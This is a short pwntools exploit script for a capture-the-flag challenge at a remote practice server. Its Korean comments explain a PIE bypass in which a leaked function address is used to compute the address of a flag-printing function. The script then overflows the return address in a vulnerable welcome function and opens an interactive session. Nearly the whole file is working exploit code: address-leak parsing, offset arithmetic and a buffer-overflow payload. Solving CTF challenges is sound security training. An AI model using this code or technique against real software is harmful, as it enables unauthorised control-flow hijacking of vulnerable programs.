from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

context(arch="i386", os='linux')

r = remote("ctf.j0n9hyun.xyz", 3008)

# welcome 함수에 bof취약점이 있었다
# PIE가 걸려있어 code영역의 주소값이 계속 바뀐다
# 또 이 함수에서 welcome함수의 주소를 출력하는데
# 이를 이용해 flag를 출력하는 함수의 offset만큼 빼주어 
# ret를 덮어주었다
r.recvuntil("0x")
j0n9hyun = r.recvline()
print(j0n9hyun)
j0n9hyun = int(j0n9hyun.strip(), 16)-(0x909-0x890)
print(hex(j0n9hyun))

payload = b"A"*0x16+p32(j0n9hyun)
print(payload)
r.sendline(payload)

r.interactive()